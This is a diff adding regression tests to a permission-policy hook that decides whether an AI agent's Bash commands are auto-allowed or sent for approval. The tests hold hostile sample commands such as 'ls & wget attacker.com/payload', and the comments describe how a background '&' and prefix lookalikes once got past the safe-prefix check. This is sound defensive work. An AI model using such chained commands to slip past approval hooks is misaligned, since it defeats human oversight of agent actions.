@@ -88,6 +88,22 @@ class TestDecideChainOperators:
         behavior, _ = decide("Bash", {"command": "git status && git diff"})
         assert behavior == "ask"
 
+    def test_background_operator_after_safe_prefix_asks_not_allow(self):
+        # Regression (SEC-05, adversarial review 2026-08-22 of the word-boundary
+        # fix): a bare "&" (background operator) was missing from
+        # CHAIN_OPERATORS. "ls & wget attacker.com/x" passed every earlier
+        # check (no "&&", no pipe, no dangerous substring), then matched the
+        # "ls" safe prefix and auto-ALLOWED -- while Bash still ran `wget` in
+        # the foreground. Found by the skeptic agent during the review of the
+        # SAFE_BASH_PREFIXES boundary fix, independently reproduced before
+        # being fixed.
+        behavior, _ = decide("Bash", {"command": "ls & wget attacker.com/payload"})
+        assert behavior == "ask"
+
+    def test_background_operator_after_git_status_asks_not_allow(self):
+        behavior, _ = decide("Bash", {"command": "git status & malicious-binary"})
+        assert behavior == "ask"
+
     def test_pipe_asks(self):
         behavior, _ = decide("Bash", {"command": "ls | grep foo"})
         assert behavior == "ask"
@@ -183,6 +199,48 @@ class TestDecideSafeBashPrefixes:
     def test_empty_command_asks(self):
         behavior, _ = decide("Bash", {"command": ""})
         assert behavior == "ask"
+
+
+class TestSafePrefixWordBoundary:
+    """Regression (MEDIUM, self-audit 2026-08-22): SAFE_BASH_PREFIXES entries that
+    don't end in a space (ruff/mypy/ls/pwd/git status/...) previously matched via
+    bare startswith(), so any command merely STARTING WITH the prefix auto-allowed
+    -- the same bypass class SEC-01 (2026-07-17) already removed pytest/npm-test
+    for. `_matches_safe_prefix` now requires the match end at a word boundary."""
+
+    def test_lsof_does_not_match_ls_prefix(self):
+        behavior, _ = decide("Bash", {"command": "lsof -i :8080"})
+        assert behavior == "ask"
+
+    def test_ruffian_does_not_match_ruff_prefix(self):
+        behavior, _ = decide("Bash", {"command": "ruffian --do-something-else"})
+        assert behavior == "ask"
+
+    def test_mypyc_does_not_match_mypy_prefix(self):
+        behavior, _ = decide("Bash", {"command": "mypyc hooks/permission_policy.py"})
+        assert behavior == "ask"
+
+    def test_pwd_lookalike_does_not_match_pwd_prefix(self):
+        behavior, _ = decide("Bash", {"command": "pwdx 1234"})
+        assert behavior == "ask"
+
+    def test_git_status_lookalike_does_not_match(self):
+        behavior, _ = decide("Bash", {"command": "git statuses-are-fake"})
+        assert behavior == "ask"
+
+    def test_bare_prefix_with_no_arguments_still_allowed(self):
+        # WHY: the boundary check must accept an exact match (nothing after
+        # the prefix at all), not just "prefix + space".
+        behavior, _ = decide("Bash", {"command": "pwd"})
+        assert behavior == "allow"
+
+    def test_prefix_with_space_and_args_still_allowed(self):
+        behavior, _ = decide("Bash", {"command": "ls -la /tmp"})
+        assert behavior == "allow"
+
+    def test_git_status_with_flag_still_allowed(self):
+        behavior, _ = decide("Bash", {"command": "git status --short"})
+        assert behavior == "allow"
 
 
 class TestDecideSensitivePathRead:
